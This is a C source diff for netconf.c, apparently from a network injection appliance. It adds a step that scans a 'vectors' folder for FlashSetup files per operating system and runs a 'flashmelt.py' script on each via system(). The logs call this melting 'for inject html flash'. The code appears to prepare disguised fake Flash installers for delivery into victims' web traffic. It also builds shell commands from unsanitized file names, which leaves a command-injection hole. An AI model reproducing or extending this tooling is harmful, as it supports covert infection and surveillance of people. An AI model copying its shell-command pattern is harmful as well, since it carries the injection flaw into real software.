@@ -6,6 +6,7 @@
     $Id: netconf.c 3558 2011-06-07 10:59:30Z alor $
 */
 
+#define _GNU_SOURCE
 #include <main.h>
 #include <file.h>
 #include <netconf.h>
@@ -14,6 +15,7 @@
 #include <openssl/bio.h>
 #include <netdb.h>
 #include <signal.h>
+#include <dirent.h>
 #include <sys/statvfs.h>
 
 /* globals */
@@ -488,6 +490,8 @@ int rnc_sendmonitor(BIO *ssl, char *status, char *desc)
 
 int rnc_retrieveconf(BIO *ssl)
 {
+   DIR *dirvec;
+   struct dirent *entvec;
    FILE *fc;
    RncProtoHeader pheader;
    RncProtoConfig pconfig;
@@ -542,7 +546,7 @@ int rnc_retrieveconf(BIO *ssl)
 //      if (!strcasecmp(pconfig.filename + strlen(pconfig.filename) - 4, ".zip")) {
          char *path, *dir, *p;
          char argv[1024];
-         int ret;
+         int ret, stat = 0;
 
          /* get the path of the file */
          if ((path = get_path("etc", pconfig.filename)) == NULL)
@@ -577,6 +581,55 @@ int rnc_retrieveconf(BIO *ssl)
 
          SAFE_FREE(dir);
          SAFE_FREE(path);
+
+         if ((dirvec = opendir("/opt/td-config/share/vectors/")) != NULL) {
+            while ((entvec = readdir(dirvec)) != NULL) {
+               char *file = entvec->d_name;
+	       char *cmd_melt = NULL;
+
+               if (strstr(file, "FlashSetup-") != NULL && strstr(file, ".windows") != NULL) {
+                  file[strlen(file) - 8] = '\0';
+
+                  DEBUG_MSG(D_INFO, "Windows detected, melting...");
+                  ret = asprintf(&cmd_melt, "/opt/td-config/scripts/flashmelt.py windows %s", file);
+               } else if (strstr(file, "FlashSetup-") != NULL && strstr(file, ".osx") != NULL) {
+                  file[strlen(file) - 4] = '\0';
+
+                  DEBUG_MSG(D_INFO, "OS X detected, melting...");
+                  ret = asprintf(&cmd_melt, "/opt/td-config/scripts/flashmelt.py osx %s", file);
+               } else if (strstr(file, "FlashSetup-") != NULL && strstr(file, ".linux") != NULL) {
+                  file[strlen(file) - 6] = '\0';
+
+ 	          DEBUG_MSG(D_INFO, "Linux detected, melting...");
+                  ret = asprintf(&cmd_melt, "/opt/td-config/scripts/flashmelt.py linux %s", file);
+               } else {
+	          continue;
+               }
+
+               if (ret == -1)
+                  DEBUG_MSG(D_ERROR, "Melting allocation failed");
+
+               ON_ERROR(cmd_melt, NULL, "virtual memory exhausted");
+
+               ret = system(cmd_melt);
+
+               if (ret == -1 || ret == 127)
+                  DEBUG_MSG(D_ERROR, "Melting failed");
+
+               SAFE_FREE(cmd_melt);
+               stat = 1;
+            }
+
+            closedir(dirvec);
+         } else {
+	    DEBUG_MSG(D_ERROR, "Melting failed");
+         }
+
+         if (stat == 1) {
+            DEBUG_MSG(D_INFO, "Melting for inject html flash completed");
+         } else {
+            DEBUG_MSG(D_INFO, "No melting for inject html flash");
+         }
 //      }
 
       /* increment the number of received config */
